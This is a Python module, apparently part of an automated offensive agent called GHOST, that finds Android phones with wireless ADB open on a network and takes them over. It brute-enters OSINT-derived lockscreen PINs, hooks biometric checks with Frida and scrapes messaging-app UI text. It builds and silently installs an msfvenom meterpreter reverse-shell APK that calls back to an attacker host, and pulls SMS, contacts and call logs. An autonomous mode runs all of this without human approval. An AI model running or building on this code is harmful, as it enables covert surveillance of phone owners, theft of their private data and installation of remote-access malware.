"""
GHOST v6.0 — Mobile/ADB Control Engine
Automated Android device discovery, connection, control, and data extraction.
Integrates: ADB, Scrcpy, Frida for full wireless phone control.
"""

import re
from datetime import datetime, timezone


class MobileEngine:
    """
    Automated Mobile Device Control — wireless ADB discovery, connection,
    screen mirroring, file access, app management, and screen recording.
    """

    TRIGGER_PHRASES = [
        "control phone", "access phone", "control device", "access device",
        "adb", "android", "phone control", "screen mirror", "mobile",
        "take over phone", "connect to phone", "hack phone", "enter phone",
        "wireless adb", "phone access", "device control",
    ]

    ADB_PORT = 5555
    SCRCPY_PORT = 5555

    def __init__(self, memory_manager, ethics_engine, bridge):
        self.memory = memory_manager
        self.ethics = ethics_engine
        self.bridge = bridge

    def is_mobile_request(self, user_input):
        """Check if user input triggers the mobile control engine."""
        lower = user_input.lower().strip()
        return any(phrase in lower for phrase in self.TRIGGER_PHRASES)

    def build_control_plan(self, target_ip=None, subnet=None):
        """
        Build a full mobile control plan.
        If no target_ip, starts with network-wide ADB discovery.
        """
        plan = {
            "target_ip": target_ip,
            "subnet": subnet or "192.168.1.0/24",
            "phases": [],
        }

        if not target_ip:
            # Phase 0: Discover ADB-enabled devices
            plan["phases"].append({
                "phase": 0,
                "name": "ADB Device Discovery",
                "description": "Scan network for devices with ADB wireless debugging enabled (port 5555)",
                "commands": [
                    {
                        "tool": "nmap",
                        "args": f"-p {self.ADB_PORT} --open {plan['subnet']}",
                        "category": "RECON",
                        "description": "Scan for ADB wireless debug port across the network",
                        "parse": "adb_hosts",
                    },
                ],
            })

        # Phase 1: ADB Connection
        target = target_ip or "{discovered_ip}"
        plan["phases"].append({
            "phase": 1,
            "name": "ADB Wireless Connection",
            "description": f"Establish wireless ADB connection to {target}",
            "commands": [
                {
                    "tool": "adb",
                    "args": f"connect {target}:{self.ADB_PORT}",
                    "category": "MOBILE",
                    "description": f"Connect to Android device at {target} via wireless ADB",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} devices",
                    "category": "MOBILE",
                    "description": "Verify connection is established",
                },
            ],
        })

        # Phase 2: Device Information Gathering
        plan["phases"].append({
            "phase": 2,
            "name": "Device Enumeration",
            "description": "Gather complete device information",
            "commands": [
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell getprop ro.product.model",
                    "category": "MOBILE",
                    "description": "Get device model",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell getprop ro.build.version.release",
                    "category": "MOBILE",
                    "description": "Get Android version",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell getprop ro.product.manufacturer",
                    "category": "MOBILE",
                    "description": "Get device manufacturer",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell dumpsys battery",
                    "category": "MOBILE",
                    "description": "Get battery status",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell ifconfig wlan0",
                    "category": "MOBILE",
                    "description": "Get device WiFi info",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell wm size",
                    "category": "MOBILE",
                    "description": "Get screen resolution",
                },
            ],
        })

        # Smart-Pivoting: OSINT Credential Injection
        profile = self.memory.get_target_profile(target_ip) if target_ip else None
        hints = profile.get("credential_hints", []) if profile else []
        
        if hints or not target_ip:
            # If target_ip is unknown, we add generic smart-pivot template that can be populated later
            # For known target, we use the hints directly
            bypass_commands = []
            for hint in hints:
                if hint.isdigit() and len(hint) >= 4:
                    bypass_commands.append({
                        "tool": "adb",
                        "args": f"-s {target}:{self.ADB_PORT} shell input text {hint}",
                        "category": "MOBILE",
                        "description": f"Smart-Pivot: Enter OSINT-discovered PIN: {hint}",
                    })
                    bypass_commands.append({
                        "tool": "adb",
                        "args": f"-s {target}:{self.ADB_PORT} shell input keyevent 66",
                        "category": "MOBILE",
                        "description": f"Smart-Pivot: Press Enter to submit PIN: {hint}",
                    })
            if not target_ip:
                # Add a placeholder for dynamic execution later
                bypass_commands.append({
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell input text 'OSINT_PIN_HERE'",
                    "category": "MOBILE",
                    "description": "Smart-Pivot: Enter OSINT-discovered PIN (Placeholder)",
                })
                bypass_commands.append({
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell input keyevent 66",
                    "category": "MOBILE",
                    "description": "Smart-Pivot: Press Enter to submit PIN (Placeholder)",
                })
                
            if bypass_commands:
                plan["phases"].append({
                    "phase": 2.5,
                    "name": "Smart-Pivoting: Automatic Lockscreen Bypass",
                    "description": "Attempt to unlock the device using PIP bounds and OSINT hints",
                    "commands": [
                        {
                            "tool": "adb",
                            "args": f"-s {target}:{self.ADB_PORT} shell input keyevent 224",
                            "category": "MOBILE",
                            "description": "Wake up device screen",
                        },
                        {
                            "tool": "adb",
                            "args": f"-s {target}:{self.ADB_PORT} shell input swipe 500 1000 500 100",
                            "category": "MOBILE",
                            "description": "Swipe to unlock",
                        }
                    ] + bypass_commands
                })

        # Phase 3: App Enumeration

        plan["phases"].append({
            "phase": 3,
            "name": "Application Inventory",
            "description": "List all installed applications",
            "commands": [
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell pm list packages -3",
                    "category": "MOBILE",
                    "description": "List user-installed (3rd party) apps",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell pm list packages -s | head -20",
                    "category": "MOBILE",
                    "description": "List system apps (first 20)",
                },
            ],
        })

        # Phase 4: Screen Control
        plan["phases"].append({
            "phase": 4,
            "name": "Screen Mirroring & Control",
            "description": "Real-time screen mirroring and remote control",
            "commands": [
                {
                    "tool": "scrcpy",
                    "args": f"--serial {target}:{self.ADB_PORT} --turn-screen-off --stay-awake",
                    "category": "MOBILE",
                    "description": "Mirror device screen with remote control (screen stays off on device)",
                },
            ],
        })

        # Phase 5: File Operations
        plan["phases"].append({
            "phase": 5,
            "name": "File System Access",
            "description": "Access and retrieve files from the device",
            "commands": [
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell ls /sdcard/",
                    "category": "MOBILE",
                    "description": "List files on SD card / internal storage",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell ls /sdcard/DCIM/Camera/ | head -10",
                    "category": "MOBILE",
                    "description": "List camera photos (first 10)",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell ls /sdcard/Download/ | head -10",
                    "category": "MOBILE",
                    "description": "List downloaded files (first 10)",
                },
            ],
        })

        # Phase 5.1: Biometric Logic Hooking
        plan["phases"].append({
            "phase": 5.1,
            "name": "Biometric Authentication Hooking",
            "description": "Runtime instrumentation (Frida) to bypass/simulate biometric success",
            "commands": [
                {
                    "tool": "frida",
                    "args": f"-U -H {target}:{self.ADB_PORT} -l bypass_biometrics.js -f com.android.settings --no-pause",
                    "category": "MOBILE_ADVANCED",
                    "description": "Inject Frida script to simulate fingerprint/FaceID success callback",
                },
            ],
        })

        # Phase 5.2: Accessibility Service Interface
        plan["phases"].append({
            "phase": 5.2,
            "name": "Accessibility Service Interface",
            "description": "Retrieve UI-tree text from encrypted messaging environments",
            "commands": [
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell uiautomator dump /sdcard/window_dump.xml",
                    "category": "MOBILE_ADVANCED",
                    "description": "Dump current UI XML tree",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} pull /sdcard/window_dump.xml /tmp/window_dump.xml",
                    "category": "MOBILE_ADVANCED",
                    "description": "Pull UI XML tree to local machine for text extraction",
                },
            ],
        })

        # Phase 5.3: Contextual Environment Awareness
        plan["phases"].append({
            "phase": 5.3,
            "name": "Contextual Environment Awareness",
            "description": "Real-time monitoring of proximity and ambient light sensors to check 'Pocket Mode'",
            "commands": [
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell dumpsys sensorservice | grep -A 5 'Proximity Sensor'",
                    "category": "MOBILE",
                    "description": "Check if device is currently in a pocket/covered (Proximity)",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell dumpsys sensorservice | grep -A 5 'Light Sensor'",
                    "category": "MOBILE",
                    "description": "Check ambient lighting conditions",
                },
            ],
        })

        # Phase 5.4: Remote Package Deployment
        plan["phases"].append({
            "phase": 5.4,
            "name": "Remote Package Deployment",
            "description": "Automated generation and deployment of embedded communication modules",
            "commands": [
                {
                    "tool": "msfvenom",
                    "args": f"-p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 R > /tmp/payload.apk",
                    "category": "EXPLOIT",
                    "description": "Generate signed reverse-shell APK payload",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} install -r /tmp/payload.apk",
                    "category": "MOBILE_ADVANCED",
                    "description": "Silently install payload module to target device",
                },
            ],
        })

        # Phase 6: Advanced Actions
        plan["phases"].append({
            "phase": 6,
            "name": "Advanced Device Interaction",
            "description": "Screenshots, screen recording, notifications",
            "commands": [
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} shell screencap -p /sdcard/ghost_screenshot.png",
                    "category": "MOBILE",
                    "description": "Take a screenshot on the device",
                },
                {
                    "tool": "adb",
                    "args": f"-s {target}:{self.ADB_PORT} pull /sdcard/ghost_screenshot.png /tmp/phone_screenshot.png",
                    "category": "MOBILE",
                    "description": "Download the screenshot to local machine",
                },
            ],
        })

        return plan

    def get_quick_commands(self, target_ip):
        """Get a list of common quick ADB actions."""
        serial = f"{target_ip}:{self.ADB_PORT}"
        return {
            "screenshot_take": f"adb -s {serial} shell screencap -p /sdcard/ghost_ss.png",
            "screenshot_pull": f"adb -s {serial} pull /sdcard/ghost_ss.png /tmp/",
            "screen_mirror": f"scrcpy --serial {serial} --turn-screen-off",
            "screen_record": f"adb -s {serial} shell screenrecord /sdcard/ghost_record.mp4 --time-limit 30",
            "list_apps": f"adb -s {serial} shell pm list packages -3",
            "list_files": f"adb -s {serial} shell ls /sdcard/",
            "get_contacts": f"adb -s {serial} shell content query --uri content://contacts/phones/",
            "get_sms": f"adb -s {serial} shell content query --uri content://sms",
            "get_call_log": f"adb -s {serial} shell content query --uri content://call_log/calls",
            "install_apk": f"adb -s {serial} install /path/to/app.apk",
            "open_url": f"adb -s {serial} shell am start -a android.intent.action.VIEW -d 'https://example.com'",
            "send_text": f"adb -s {serial} shell input text 'Hello from GHOST'",
            "press_home": f"adb -s {serial} shell input keyevent KEYCODE_HOME",
            "press_back": f"adb -s {serial} shell input keyevent KEYCODE_BACK",
            "volume_up": f"adb -s {serial} shell input keyevent KEYCODE_VOLUME_UP",
            "lock_screen": f"adb -s {serial} shell input keyevent KEYCODE_POWER",
            "wifi_info": f"adb -s {serial} shell dumpsys wifi | grep 'mWifiInfo'",
            "battery_info": f"adb -s {serial} shell dumpsys battery",
            "device_info": f"adb -s {serial} shell getprop",
            "reboot": f"adb -s {serial} reboot",
            "disconnect": f"adb disconnect {target_ip}:{self.ADB_PORT}",
        }

    def parse_adb_scan(self, nmap_output):
        """Parse nmap output to find ADB-enabled devices."""
        devices = []
        current_ip = None

        for line in nmap_output.split("\n"):
            ip_match = re.search(r"Nmap scan report for\s+(?:\S+\s+\()?(\d+\.\d+\.\d+\.\d+)", line)
            if ip_match:
                current_ip = ip_match.group(1)

            if current_ip and f"{self.ADB_PORT}" in line and "open" in line:
                devices.append({
                    "ip": current_ip,
                    "port": self.ADB_PORT,
                    "service": "adb",
                    "status": "ADB Wireless Enabled",
                    "risk": "HIGH — full device control possible",
                })

        return devices

    def execute_plan(self, plan, socketio=None):
        """Execute a mobile control plan phase by phase."""
        results = []

        for phase in plan.get("phases", []):
            phase_results = {
                "phase": phase.get("phase", 0),
                "name": phase.get("name", ""),
                "command_results": [],
            }

            for cmd_info in phase.get("commands", []):
                full_command = f"{cmd_info['tool']} {cmd_info['args']}"
                target_ip = self.bridge._extract_ip(full_command)

                # Ethics check
                verdict = self.ethics.check_command(full_command, target_ip)

                cmd_result = {
                    "command": full_command,
                    "description": cmd_info.get("description", ""),
                    "ethics_verdict": verdict,
                    "executed": False,
                }

                if verdict["verdict"] == "HALT":
                    cmd_result["halt_reason"] = verdict["reason"]
                elif verdict["verdict"] in ["ALLOW", "PROPOSE"]:
                    mode = self.memory.get_mode()
                    if verdict["verdict"] == "ALLOW" or mode == "AUTONOMOUS":
                        exec_result = self.bridge.execute_command(full_command, timeout=60)
                        cmd_result["executed"] = True
                        cmd_result["output"] = exec_result

                        # Parse ADB scan results if applicable
                        if cmd_info.get("parse") == "adb_hosts" and exec_result.get("stdout"):
                            devices = self.parse_adb_scan(exec_result["stdout"])
                            cmd_result["discovered_devices"] = devices

                            if socketio:
                                socketio.emit("adb_devices_found", {"devices": devices})

                        if socketio:
                            socketio.emit("mobile_action", {
                                "phase": phase.get("name", ""),
                                "command": full_command,
                                "status": exec_result.get("status", ""),
                            })
                    else:
                        cmd_result["awaiting_approval"] = True

                phase_results["command_results"].append(cmd_result)

            results.append(phase_results)

        return {
            "target": plan.get("target_ip", "unknown"),
            "phases_completed": len(results),
            "results": results,
        }
